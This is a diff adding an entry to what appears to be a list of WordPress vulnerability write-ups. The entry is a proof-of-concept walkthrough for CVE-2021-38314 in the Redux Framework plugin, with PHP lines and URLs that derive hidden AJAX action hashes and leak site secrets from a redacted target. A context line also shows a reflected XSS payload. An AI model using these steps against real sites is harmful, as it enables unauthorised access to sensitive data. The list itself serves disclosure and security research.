@@ -102,5 +102,27 @@ wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(1)</script>
 ## Wordpress Plugin Update Confusion - The full guide how to scan and mitigate the next big Supply Chain Attack
 https://galnagli.com/Wordpress_Plugin_Update_Confusion/
 
+## Unauthenticated Sensitive Information Disclosure (CVE-2021–38314)
+### Gutenberg Template Library & Redux Framework plugin <= 4.2.11 for WordPress
+https://wahaz.medium.com/unauthenticated-sensitive-information-disclosure-at-redacted-2702224098c
+
+```
+Proof of Concept:
+1. Found subdomain blog.redacted.com is using wordpress, then try the CVE-2021–38314
+2. Using this script
+$target = “https://blog.redacted.com";
+$key1 = md5(“$target/-redux”);
+$key2 = file_get_contents(“$target/wp-admin/admin-ajax.php?action=$key1”);
+3. It returns e24eb61b09bf2340779b35xxxxxxxxxx a hash of the auth_key_secret_key with “-redux” appended.
+4. Append “-support” and md5 it again and thats the new function hook name.
+$key3 = md5($key2.’-support’);
+5. Then get the hash 1505d4269113e1bda36c47xxxxxxxxxx
+6. So what this code does is compare the code param with the output of https://verify.redux.io/?hash=1505d4269113e1bda36c47xxxxxxxxxx&site=http://blog.redacted.com/
+$redux_code = b1mzZ3%2BU0p43TZ6%2F7QJaYU0hJMHgdcT5Bc%2Bnyo4t3xUenDRm0Ef8HipC7EMKSdtpw8g65XZjxxxxxxxxxxxxxxxxxxxx
+7. Final URL https://blog.redacted.com/wp-admin/admin-ajax.php?action=1505d4269113e1bda36c47xxxxxxxxxx&code=b1mzZ3%2BU0p43TZ6%2F7QJaYU0hJMHgdcT5Bc%2Bnyo4t3xUenDRm0Ef8HipC7EMKSdtpw8g65XZjxxxxxxxxxxxxxxxxxxxx
+```
+
+
+
 
 
